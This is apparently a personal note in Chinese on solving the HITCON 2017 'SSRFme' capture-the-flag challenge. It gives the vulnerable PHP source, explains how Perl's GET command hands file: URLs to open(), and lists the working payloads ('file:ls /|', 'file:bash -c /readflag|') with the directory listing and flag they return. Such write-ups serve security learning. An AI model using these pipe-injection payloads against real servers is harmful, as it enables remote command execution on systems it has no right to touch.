![[Pasted image 20230110085126.png|500]]

---

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
?>
```

参考 [大佬的wp](https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/ricterz.me/_posts_HITCON_202017_20SSRFme/index.html)

![[Pasted image 20230110122535.png|300]]

`GET`是`perl`的一个命令，对于`file`协议的处理调用了`open`函数来实现，而`open`函数支持管道形式的文件句柄，因此可以将命令的结果作为文件处理。

由于`GET`处理`file`协议时在调用`open`前进行了一次文件存在的判断，因此需要访问两次，第一次利用`file_put_contents`创建文件，第二次进行命令执行

```
/?url=file:ls /|&filename=ls /|
```

```
/?url=file:ls /|&filename=ls /|
```

```
/sandbox/xxxx/ls /|
```

```
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

有个`readflag`，直接执行

```
/?url=file:bash -c /readflag|&filename=bash -c /readflag|
```

```
/sandbox/xxxx/bash -c /readflag|
```

```
flag is flag{1a5541cb-126c-4986-be35-c82a6c98bb6f}
```

#Web #RCE #perl #file #protocol #open #function